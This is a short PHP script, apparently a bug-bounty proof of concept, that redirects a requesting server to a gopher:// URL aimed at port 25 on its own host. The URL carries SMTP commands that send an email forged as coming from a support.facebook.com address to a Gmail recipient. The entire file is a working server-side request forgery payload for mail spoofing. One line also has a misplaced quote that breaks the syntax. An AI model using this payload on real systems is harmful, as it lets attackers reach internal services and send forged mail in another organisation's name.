<?php
	$commands = array(
		'HELO support.facebook.com',
		'MAIL FROM: <advertise-noreply@support.facebook.com>',
		'RCPT To: <bug.allmight@gmail.com'>,
		'DATA',
		'Subject: @support.facebook.com',
		'you sexy',
	);
	
	$payload = implode('%0A', $commands);

	header('Location: gopher://0:25/_'.$payload);
?>
